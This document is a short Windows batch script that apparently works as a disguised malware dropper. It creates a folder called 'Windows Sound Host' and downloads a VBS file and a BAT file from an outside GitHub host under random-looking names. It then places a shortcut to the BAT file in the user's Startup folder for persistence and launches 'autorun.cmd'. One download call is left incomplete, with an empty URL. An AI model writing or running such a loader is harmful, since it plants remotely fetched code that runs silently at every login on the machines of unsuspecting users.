@echo off 
cd \ 
if not exist %userprofile%\documents\"Windows Sound Host" ( 
    mkdir "Windows Sound Host"
)
set path1= %userprofile%\documents\"Windows Sound Host"
cd %path1%
pause 


powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/i.vbs' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/snds.bat' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat; Invoke-WebRequest ''
pause 
if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\116161as5d1a5d3a21sd51aw13s1d85aw1d35.lnk ( 
    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\116161as5d1a5d3a21sd51aw13s1d85aw1d35.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat';$s.Save()"
    
)
timeout 150
start autorun.cmd



